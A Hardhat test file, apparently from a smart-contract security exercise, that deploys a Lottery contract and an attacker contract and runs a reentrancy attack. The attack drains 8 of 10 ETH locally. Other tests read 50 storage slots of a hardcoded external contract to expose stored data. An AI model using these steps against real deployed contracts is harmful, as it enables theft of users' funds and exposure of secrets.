const { expect, use } = require("chai");
const { ethers } = require("hardhat");

describe("Attack", function () {
  let lotteryContract;
  let attackContract;

  beforeEach(async () => {
    const Lottery = await ethers.getContractFactory("Lottery");
    lotteryContract = await Lottery.deploy();
    await lotteryContract.deployed();

    const LotteryAttack = await ethers.getContractFactory("LotteryAttack");
    attackContract = await LotteryAttack.deploy(lotteryContract.address);
    await attackContract.deployed();

    [owner, addr1, addr2, addr3] = await ethers.getSigners();
  });

  it.only("Reentrancy attack drains more ETH than standard payout", async function () {
    // Initialize the lottery
    const initTx = await lotteryContract.initialiseLottery(7);
    await initTx.wait();

    // Create the teams
    const teamTx = await lotteryContract.registerTeam(attackContract.address, "Team Attack", "testpw", {
      value: ethers.utils.parseEther("2")
    });
    await teamTx.wait();

    const teamTx2 = await lotteryContract.registerTeam(owner.address, "Team Owner", "testpw", {
      value: ethers.utils.parseEther("2")
    });
    await teamTx2.wait();

    const teamTx3 = await lotteryContract.registerTeam(addr1.address, "Team Addr1", "testpw", {
      value: ethers.utils.parseEther("2")
    });
    await teamTx3.wait();

    const teamTx4 = await lotteryContract.registerTeam(addr2.address, "Team Addr2", "testpw", {
      value: ethers.utils.parseEther("2")
    });
    await teamTx4.wait();

    const teamTx5 = await lotteryContract.registerTeam(addr3.address, "Team Addr3", "testpw", {
      value: ethers.utils.parseEther("2")
    });
    await teamTx5.wait();

    let teamCount = await lotteryContract.getTeamCount();
    console.log("Team count: ", teamCount.toString());
    
    // Guess the correct answer
    const guess = await attackContract.guess(attackContract.address);
    await guess.wait();

    let teamDetails = await lotteryContract.getTeamDetails(1);
    console.log("Attack team's score: ", teamDetails[2].toString());

    const balanceBeforeAttack = await ethers.provider.getBalance(attackContract.address);
    console.log("Attack contract balance before attack: ", ethers.utils.formatEther(balanceBeforeAttack));

    // Attack the contract
    let attack = await attackContract.attack();
    await attack.wait();

    const balanceAfterAttack = await ethers.provider.getBalance(attackContract.address);
    console.log("Attack contract balance after attack: ", ethers.utils.formatEther(balanceAfterAttack));

    // The balance should be 8 since the payout is in increments of 4 ETH and there is 10 ETH in the contract from 5 teams registering with 2 ETH each
    expect(balanceAfterAttack).to.equal(ethers.utils.parseEther("8"));
  });

  it.only("Lottery has a balance after sending ETH to the contract", async function () {
    const tx = await owner.sendTransaction({
      to: lotteryContract.address,
      value: ethers.utils.parseEther("1")
    });
    await tx.wait();

    const balance = await ethers.provider.getBalance(lotteryContract.address);
    expect(balance).to.equal(ethers.utils.parseEther("1"));
  });

  it("Attaches to an external contract", async function () {
    const myContract = await (await ethers.getContractFactory("Lottery")).attach("0x90649B117656e54aB4F2592c1E83e7145Eae1290");

    // Do whatever you need with the external contract

  });

  it("Attaches gets data from storage at an external contract", async function () {
    for (let x = 0; x < 50; x++) {
      const test = await ethers.provider.getStorageAt("0x90649B117656e54aB4F2592c1E83e7145Eae1290", x);
      console.log("This is my test: ", test);
    }

    // Do whatever you need with the external contract

  });

  it("Gets the balance of an address", async function () {
    const balance0ETH = await ethers.provider.getBalance("0xF803aC944814374a8664B138E280526a2cEEa95b");
    console.log("This is the test value: ", ethers.utils.formatEther(balance0ETH));
  });
});
